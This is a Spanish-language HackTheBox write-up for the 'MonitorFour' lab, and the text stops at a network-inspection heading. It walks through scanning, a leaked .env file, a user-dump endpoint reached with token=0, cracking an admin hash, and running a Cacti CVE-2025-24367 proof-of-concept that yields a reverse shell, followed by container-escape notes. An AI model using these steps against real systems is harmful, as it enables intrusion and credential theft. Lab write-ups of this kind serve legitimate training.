# HTB: MonitorFour

## Host: Windows
## IP: 10.10.11.98

## Procedimiento y comandos

#### Paso 1: Enumeracion

```bash
┌──(root💀kali)-[/home/kali/HTB/MonitorFour]
└─# nmap -A -vv -p- -T4 -Pn -oX monitor-four.scan 10.10.11.98 --webxml
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-10 15:50 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:50
Completed Parallel DNS resolution of 1 host. at 15:50, 0.02s elapsed
Initiating SYN Stealth Scan at 15:50
Scanning 10.10.11.98 [65535 ports]
Discovered open port 80/tcp on 10.10.11.98
Discovered open port 5985/tcp on 10.10.11.98
SYN Stealth Scan Timing: About 78.64% done; ETC: 15:55 (0:00:57 remaining)
Completed SYN Stealth Scan at 15:54, 249.04s elapsed (65535 total ports)
Initiating Service scan at 15:54
Scanning 2 services on 10.10.11.98
Completed Service scan at 15:55, 7.29s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.98
Retrying OS detection (try #2) against 10.10.11.98
Initiating Traceroute at 15:55
Completed Traceroute at 15:55, 0.39s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 15:55
Completed Parallel DNS resolution of 2 hosts. at 15:55, 0.01s elapsed
NSE: Script scanning 10.10.11.98.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 19.97s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 2.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
Nmap scan report for 10.10.11.98
Host is up, received user-set (0.25s latency).
Scanned at 2025-12-10 15:50:47 -03 for 292s
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2022
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/10%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6939C22B%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10C%TI=RD%TS=A)
SEQ(SP=106%GCD=1%ISR=105%TI=I%TS=A)
OPS(O1=M542NW8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.057 days (since Wed Dec 10 14:33:50 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   202.82 ms 10.10.16.1
2   379.49 ms 10.10.11.98

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 295.63 seconds
           Raw packets sent: 131353 (5.785MB) | Rcvd: 228 (12.204KB)
```

* Feroxbuster

```bash
┌──(root💀kali)-[/home/kali/HTB/MonitorFour]
└─# feroxbuster -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,pdf,html,txt,js,txt,log --dont-filter --status-codes 200,204,301,302,307,403,401 --threads 50
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://monitorsfour.htb/
 🚩  In-Scope Url          │ monitorsfour.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 403, 401]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, pdf, html, txt, js, txt, log]
 🏁  HTTP methods          │ [GET]
 🤪  Filter Wildcards      │ false
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        3w       35c http://monitorsfour.htb/user
200      GET        4l       35w      367c http://monitorsfour.htb/contact
200      GET        6l      184w     9227c http://monitorsfour.htb/static/admin/assets/js/plugins/loaders/blockui.min.js
200      GET       84l      212w     3099c http://monitorsfour.htb/forgot-password
200      GET        2l      210w    12507c http://monitorsfour.htb/static/admin/assets/js/plugins/loaders/pace.min.js
200      GET        6l       34w     2166c http://monitorsfour.htb/static/images/services/02.png
200      GET       38l      117w     2813c http://monitorsfour.htb/static/js/plugins.js
200      GET       71l      130w     1872c http://monitorsfour.htb/static/js/custom.js
200      GET        7l      430w    36816c http://monitorsfour.htb/static/admin/assets/js/core/libraries/bootstrap.min.js
200      GET        1l      235w    12063c http://monitorsfour.htb/static/images/review.svg
200      GET       11l       15w      188c http://monitorsfour.htb/static/css/plugins.css
200      GET        5l       30w     1616c http://monitorsfour.htb/static/images/services/01.png
200      GET        9l       43w     3028c http://monitorsfour.htb/static/images/services/03.png
200      GET       24l       99w      770c http://monitorsfour.htb/static/js/smoothscroll.js
200      GET       19l       62w     3695c http://monitorsfour.htb/static/images/services/04.png
200      GET       96l      239w     4340c http://monitorsfour.htb/login
200      GET      607l     1130w    16986c http://monitorsfour.htb/static/admin/assets/js/core/app.js
200      GET        1l        1w    37820c http://monitorsfour.htb/static/admin/assets/css/minified/colors.min.css
200      GET      109l      619w    13655c http://monitorsfour.htb/static/images/service.svg
200      GET        1l      393w    15974c http://monitorsfour.htb/static/images/about-us.svg
200      GET      129l      673w    57007c http://monitorsfour.htb/static/admin/assets/images/logo.png
200      GET        5l      369w    21003c http://monitorsfour.htb/static/js/popper.min.js
200      GET        1l      359w    22207c http://monitorsfour.htb/static/images/banner.svg
200      GET      935l     1752w    15174c http://monitorsfour.htb/static/css/style.css
200      GET        4l     1305w    84345c http://monitorsfour.htb/static/admin/assets/js/core/libraries/jquery.min.js
200      GET     1190l     1226w    47483c http://monitorsfour.htb/static/admin/assets/css/icons/icomoon/styles.css
301      GET        7l       11w      162c http://monitorsfour.htb/static/admin/assets/js => http://monitorsfour.htb/static/admin/assets/js/
301      GET        7l       11w      162c http://monitorsfour.htb/static/admin/assets/images => http://monitorsfour.htb/static/admin/assets/images/
301      GET        7l       11w      162c http://monitorsfour.htb/static/admin/assets/css => http://monitorsfour.htb/static/admin/assets/css/
200      GET        7l      683w    60010c http://monitorsfour.htb/static/js/bootstrap.min.js
200      GET        7l      277w    44342c http://monitorsfour.htb/static/js/owl.carousel.min.js
200      GET        1l     1430w   108349c http://monitorsfour.htb/static/admin/assets/css/minified/core.min.css
200      GET       87l     1326w   157954c http://monitorsfour.htb/static/admin/assets/images/logo.ico
403      GET        7l        9w      146c http://monitorsfour.htb/static/admin/
200      GET        1l     1733w   122310c http://monitorsfour.htb/static/admin/assets/css/minified/bootstrap.min.css
403      GET        7l        9w      146c http://monitorsfour.htb/static/admin/assets/
301      GET        7l       11w      162c http://monitorsfour.htb/static/images => http://monitorsfour.htb/static/images/
403      GET        7l        9w      146c http://monitorsfour.htb/static/
301      GET        7l       11w      162c http://monitorsfour.htb/static/admin => http://monitorsfour.htb/static/admin/
301      GET        7l       11w      162c http://monitorsfour.htb/static/js => http://monitorsfour.htb/static/js/
200      GET        4l     1293w    86709c http://monitorsfour.htb/static/js/jquery-min.js
200      GET      338l      982w    13688c http://monitorsfour.htb/
301      GET        7l       11w      162c http://monitorsfour.htb/static/css => http://monitorsfour.htb/static/css/
200      GET        1l     5059w   256503c http://monitorsfour.htb/static/admin/assets/css/minified/components.min.css
403      GET        7l        9w      146c http://monitorsfour.htb/static/images/services/
403      GET        7l        9w      146c http://monitorsfour.htb/static/images/
403      GET        7l        9w      146c http://monitorsfour.htb/static/js/
403      GET        7l        9w      146c http://monitorsfour.htb/static/css/
200      GET     4734l    29110w  2364586c http://monitorsfour.htb/static/admin/assets/images/servers.png
403      GET        7l        9w      146c http://monitorsfour.htb/.html
403      GET        7l        9w      146c http://monitorsfour.htb/static/.html
403      GET        7l        9w      146c http://monitorsfour.htb/static/js/.html
403      GET        7l        9w      146c http://monitorsfour.htb/static/images/.html
403      GET        7l        9w      146c http://monitorsfour.htb/static/css/.html
403      GET        7l        9w      146c http://monitorsfour.htb/static/admin/.html
403      GET        7l        9w      146c http://monitorsfour.htb/static/images/services/.html
403      GET        7l        9w      146c http://monitorsfour.htb/static/admin/assets/.html
301      GET        7l       11w      162c http://monitorsfour.htb/static/images/blog => http://monitorsfour.htb/static/images/blog/
301      GET        7l       11w      162c http://monitorsfour.htb/static/admin/assets => http://monitorsfour.htb/static/admin/assets/
301      GET        7l       11w      162c http://monitorsfour.htb/static => http://monitorsfour.htb/static/
301      GET        7l       11w      162c http://monitorsfour.htb/static/admin/assets/swf => http://monitorsfour.htb/static/admin/assets/swf/
301      GET        7l       11w      162c http://monitorsfour.htb/static/images/services => http://monitorsfour.htb/static/images/services/
301      GET        7l       11w      162c http://monitorsfour.htb/static/fonts => http://monitorsfour.htb/static/fonts/
200      GET        1l     5104w    64362c http://monitorsfour.htb/static/js/main.js
200      GET      306l      960w    11647c http://monitorsfour.htb/static/css/css2
301      GET        7l       11w      162c http://monitorsfour.htb/static/admin/assets/locales => http://monitorsfour.htb/static/admin/assets/locales/
[####################] - 69m  2127528/2127528 0s      found:66      errors:257910 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/ 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/static/admin/assets/ 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/static/ 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/static/admin/ 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/static/images/services/ 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/static/css/ 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/static/images/ 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/static/js/ 
[####################] - 68m   212672/212672  52/s    http://monitorsfour.htb/static/images/blog/ 
[####################] - 67m   212672/212672  53/s    http://monitorsfour.htb/static/fonts/
```
* Nuclei

```bash
┌──(root💀kali)-[/home/kali/HTB/MonitorFour]
└─# nuclei -u http://monitorsfour.htb -o nuclei_scan.txt

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

                projectdiscovery.io

[WRN] Found 10 templates loaded with deprecated protocol syntax, update before v3 for continued support.
[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 9001
[INF] Executing 8984 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 17 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1909 (Reduced 1777 Requests)
[INF] Using Interactsh Server: oast.live
[codeigniter-env] [http] [high] http://monitorsfour.htb/.env [paths="/.env"]
[laravel-env] [http] [high] http://monitorsfour.htb/.env [paths="/.env"]
[generic-env] [http] [high] http://monitorsfour.htb/.env [paths="/.env"]
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://monitorsfour.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://monitorsfour.htb
[php-detect] [http] [info] http://monitorsfour.htb ["8.3.27"]
[missing-cookie-samesite-strict] [http] [info] http://monitorsfour.htb ["PHPSESSID=287b796d7efa4c336c85bfe84cacd211; path=/"]
[tech-detect:nginx] [http] [info] http://monitorsfour.htb
[tech-detect:php] [http] [info] http://monitorsfour.htb
[caa-fingerprint] [dns] [info] monitorsfour.htb
[INF] Scan completed in 58m. 19 matches found.
```

El .env revela lo siguiente:
#### Credenciales DB MySql
```bash
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```
* Subdominios
```bash
┌──(root💀kali)-[/home/kali/HTB/MonitorFour]
└─# ffuf -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.monitorsfour.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1707ms]
#www                    [Status: 400, Size: 150, Words: 5, Lines: 8, Duration: 578ms]
#mail                   [Status: 400, Size: 150, Words: 5, Lines: 8, Duration: 617ms]
:: Progress: [19966/19966] :: Job [1/1] :: 158 req/sec :: Duration: [0:02:47] :: Errors: 0 ::
```
* Nuclei

```bash
┌──(root💀kali)-[/home/kali/HTB/MonitorFour]
└─# nuclei -u http://cacti.monitorsfour.htb -o cacti_scan.txt

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

                projectdiscovery.io

[WRN] Found 10 templates loaded with deprecated protocol syntax, update before v3 for continued support.
[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 9001
[INF] Executing 8984 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 17 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1909 (Reduced 1777 Requests)
[INF] Using Interactsh Server: oast.site
[waf-detect:nginxgeneric] [http] [info] http://cacti.monitorsfour.htb
[cacti-panel] [http] [info] http://cacti.monitorsfour.htb/cacti/ ["","1.2.28 | (c) 2004-2025 - The Cacti"]
[http-missing-security-headers:permissions-policy] [http] [info] http://cacti.monitorsfour.htb/cacti/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://cacti.monitorsfour.htb/cacti/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://cacti.monitorsfour.htb/cacti/
[http-missing-security-headers:strict-transport-security] [http] [info] http://cacti.monitorsfour.htb/cacti/
[http-missing-security-headers:x-content-type-options] [http] [info] http://cacti.monitorsfour.htb/cacti/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://cacti.monitorsfour.htb/cacti/
[http-missing-security-headers:referrer-policy] [http] [info] http://cacti.monitorsfour.htb/cacti/
[http-missing-security-headers:clear-site-data] [http] [info] http://cacti.monitorsfour.htb/cacti/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://cacti.monitorsfour.htb/cacti/
[tech-detect:nginx] [http] [info] http://cacti.monitorsfour.htb/cacti/
[tech-detect:php] [http] [info] http://cacti.monitorsfour.htb/cacti/
[wordpress-theme-detect:modern] [http] [info] http://cacti.monitorsfour.htb/cacti/
[tech-detect:nginx] [http] [info] http://cacti.monitorsfour.htb/cacti
[tech-detect:nginx] [http] [info] http://cacti.monitorsfour.htb
[tech-detect:php] [http] [info] http://cacti.monitorsfour.htb
[caa-fingerprint] [dns] [info] cacti.monitorsfour.htb
[INF] Scan completed in 11m. 18 matches found.
```

* [Posibles CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-7458/product_id-12584/version_id-1907377/Cacti-Cacti-1.2.28.html?page=1&order=5):

CVE-2025-24367 : [Paper](https://www.cve.news/cve-2025-24367/)

**Dependencias/Requerimientos:**
- Cuenta de usuario valida, credenciales user/password
- cookie generada 

Para la gran mayoria de exploits de cacti necesitamos una sesion de usuario valida. Volvemos a poner foco en el sitio web principal.
podemos explorar los distintos path de url encontrados con feroxbuster

El primer path "/user" devuelve:

```bash
{"error":"Missing token parameter"}
```
Es posible quizas fuzzear el parametro token..

Con probar valores aleatorios como el 0 devuelve lo siguiente:

http://monitorsfour.htb/user?token=0

```bash
[
        {
                "id":2,
                "username":"admin",
                "email":"admin@monitorsfour.htb",
                "password":"56b32eb43e6f15395f6c46c1c9e1cd36",
                "role":"super user",
                "token":"8024b78f83f102da4f",
                "name":"Marcus Higgins",
                "position":"System Administrator",
                "dob":"1978-04-26",
                "start_date":"2021-01-12",
                "salary":"320800.00"
        },
        {
                "id":5,
                "username":"mwatson",
                "email":"mwatson@monitorsfour.htb",
                "password":"69196959c16b26ef00b77d82cf6eb169",
                "role":"user","token":"0e543210987654321",
                "name":"Michael Watson",
                "position":"Website Administrator",
                "dob":"1985-02-15",
                "start_date":"2021-05-11",
                "salary":"75000.00"
        },
        {
                "id":6,
                "username":"janderson",
                "email":"janderson@monitorsfour.htb",
                "password":"2a22dcf99190c322d974c8df5ba3256b",
                "role":"user",
                "token":"0e999999999999999",
                "name":"Jennifer Anderson",
                "position":"Network Engineer",
                "dob":"1990-07-16",
                "start_date":"2021-06-20",
                "salary":"68000.00"
        },
        {
                "id":7,
                "username":"dthompson",
                "email":"dthompson@monitorsfour.htb",
                "password":"8d4a7e7fd08555133e056d9aacb1e519",
                "role":"user","token":"0e111111111111111",
                "name":"David Thompson",
                "position":"Database Manager",
                "dob":"1982-11-23",
                "start_date":"2022-09-15",
                "salary":"83000.00"
        }
]
```

El hash del usuario admin devuelve este password: **wonderful1**

Login en http://monitorsfour.htb 

admin/wonderful1

Login en http://cacti.monitorsfour.htb

marcus/wonderful1

Ya tenemos la cuenta de cacti para ejecutar el exploit que nos de el acceso inicial.

Procedemos con el poc del autor de la maquina: [exploit](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)

#### Paso 2: Acceso inicial
Luego de seguir las instrucciones de instalacion del repo

```bash
┌──(venv-cactiPoc)─(root💀kali)-[/home/kali/HTB/MonitorFour/CVE-2025-24367-Cacti-PoC]
└─# python3 exploit.py -u marcus -p wonderful1 -i 10.10.16.20 -l 4444 -url http://cacti.monitorsfour.htb
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: 93NWa.php
[+] Got payload: /bash
[i] Created PHP filename: upqPO.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

* Penelope

```bash
┌──(root💀kali)-[/home/kali/HTB/MonitorFour]
└─# penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.5 • 192.168.45.158 • 172.17.0.1 • 10.10.16.20
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 821fbd6a43fa~10.10.11.98-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.16.20:4444
[-] Failed spawning new session
[+] Interacting with session [1], Shell Type: Raw, Menu key: Ctrl-C 
[+] Logging to /root/.penelope/sessions/821fbd6a43fa~10.10.11.98-Linux-x86_64/2025_12_12-11_13_11-464.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from 821fbd6a43fa~10.10.11.98-Linux-x86_64 😍 Assigned SessionID <2>
www-data@821fbd6a43fa:~/html/cacti$ 
www-data@821fbd6a43fa:/home/marcus$ ls -la
ls -la
total 28
drwxr-xr-x 1 marcus marcus 4096 Dec 12 13:50 .
drwxr-xr-x 1 root   root   4096 Nov 10 16:15 ..
-rw-r--r-- 1 marcus marcus  220 Jul 30 19:28 .bash_logout
-rw-r--r-- 1 marcus marcus 3526 Jul 30 19:28 .bashrc
-rw-r--r-- 1 marcus marcus  807 Jul 30 19:28 .profile
-r-xr-xr-x 1 root   root     34 Dec 12 13:47 user.txt
www-data@821fbd6a43fa:/home/marcus$ cat user.txt
cat user.txt
bf8f**************************666f
```
#### Paso 3: Privilege Escalation / Docker container Escape

```bash
www-data@821fbd6a43fa:/home$ env
env
HOSTNAME=821fbd6a43fa
PHP_VERSION=8.3.27
PHP_INI_DIR=/usr/local/etc/php
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA
PHP_LDFLAGS=-Wl,-O1 -pie
PWD=/home
HOME=/var/www
PHP_SHA256=c15a09a9d199437144ecfef7d712ec4ca5c6820cf34acc24cc8489dd0cee41ba
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c
PHP_URL=https://www.php.net/distributions/php-8.3.27.tar.xz
USER=www-data
SHLVL=3
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_ASC_URL=https://www.php.net/distributions/php-8.3.27.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
_=/usr/bin/env
OLDPWD=/home/marcus
www-data@821fbd6a43fa:/home$ hostname
hostname
821fbd6a43fa
```
Aparentemente por el nombre del host estamos dentro de un contenedor.

#### 1) Buscar mas indicios de que estoy en un contenedor.
* 
#### 2) Explorar patrones comunes en Container Escape - Configuraciones del OS del contenedor
* verseion kernel
* sudo -l
* grupo 
* usuario
#### 3) Buscar archivos:
* Archivos configuracion
* Credenciales /SSH:id_rsa 
* .db
*  buckups
#### 4) Procesos:
* Base de Datos
* Localhost servidor web

#### 5) Configuraciones de red
* Buscar ips para posible pivoting portforwarding

#### 6) Explorar posible enumeracion de recursos externos al contenedor: montajes -> mount umount etc

```bash
www-data@821fbd6a43fa:~/html/cacti$ mount
mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/367/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/364/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/363/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/362/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/361/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/360/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/359/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/358/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/331/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/330/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/196/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/195/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/194/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/193/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/192/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/191/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/190/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/189/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/188/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/187/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/186/fs:/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/185/fs,upperdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/368/fs,workdir=/var/lib/desktop-containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/368/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/sde on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sde on /etc/hostname type ext4 (rw,relatime)
/dev/sde on /etc/hosts type ext4 (rw,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/interrupts type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/latency_stats type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)
```

```bash
www-data@821fbd6a43fa:~/html/cacti$ cat /proc/1/cgroup
cat /proc/1/cgroup
0::/
www-data@821fbd6a43fa:~/html/cacti$ cat /proc/self/cgroup
cat /proc/self/cgroup
0::/
www-data@821fbd6a43fa:~/html/cacti$ ls -la /.dockerenv 2>/dev/null
ls -la /.dockerenv 2>/dev/null
-rwxr-xr-x 1 root root 0 Nov 10 17:04 /.dockerenv
```

### inspeccion de red:
```bash
